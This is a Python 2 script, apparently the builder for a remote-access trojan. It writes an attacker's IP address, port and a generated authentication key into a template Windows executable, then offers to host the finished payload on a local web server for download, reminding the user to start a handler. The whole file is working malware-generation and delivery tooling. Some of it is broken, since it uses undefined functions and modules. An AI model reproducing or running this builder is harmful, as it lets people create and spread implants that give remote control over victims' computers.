#!/usr/bin/env python2

import sys, shutil, errno, os, BaseHTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler

try:
	sys.argv[3]
except IndexError as e:
	print e
	exit("Usage: encode.py <IP> <port> <output-file>")


lhost = sys.argv[1]

try: lhost_bytes = [chr(int(part)) for part in lhost.split(".")]
except ValueError: exit(lhost+" is not a correct IP address.")

if len(lhost_bytes) != 4 or not all(0 <= ord(i) <= 255 for i in lhost_bytes):
	print len(lhost_bytes)
	print lhost_bytes
	exit(lhost+" is not a correct IP address.")
	
try:
	port = int(sys.argv[2])
	if not 0 < port < 65535: raise ValueError
except ValueError: exit(sys.argv[2]+" is not a valid port number.")

output = sys.argv[3]

if not output.endswith(".exe"): output += ".exe"

try:
    os.makedirs('./payload/')
except OSError as exc:
    if exc.errno == errno.EEXIST and os.path.isdir('./payload/'):
        pass
    else:
        raise
		
if not os.path.isfile("stelf.guid"):
	print_info("Generating secret for authentication, it will be stored in 'stelf.guid'")
	with open("stelf.guid", "wb") as f:
		f.write(hashlib.sha512(str(random.randrange(10**100, (10**101)-1))).hexdigest()[:30])

shutil.copy2('./template/template.exe', './payload/'+output)

print "Encoding " + output + " " + lhost + ":" + str(port)
lport_bytes = [chr(int(hex(port)[2:4], 16)), chr(int(hex(port)[4:6].ljust(2,"0"), 16))]
with open('./payload/'+output,"r+b") as f:
	f.seek(972, 0)
	for part in lhost_bytes:
		f.write(part)
	for part in lport_bytes:
		f.write(part)

	with open("stelf.guid","rb") as a:
		auth_key = a.read()
		f.seek(930)
		f.write(auth_key)

print "Payload generated, would you like to start a webserver there?"
ans = raw_input("y/n ").lower()

if ans == "y":
    os.chdir('./payload/')
    HandlerClass = SimpleHTTPRequestHandler
    ServerClass  = BaseHTTPServer.HTTPServer
    HandlerClass.protocol_version = "HTTP/1.0"
    httpd = ServerClass((lhost, 8000), HandlerClass)
    
    sa = httpd.socket.getsockname()
    print "Get your executable at:"
    print "http://" + sa[0] + ":" + str(sa[1]) + "/" + output

    httpd.serve_forever()

    print "Make sure your handler is running...."
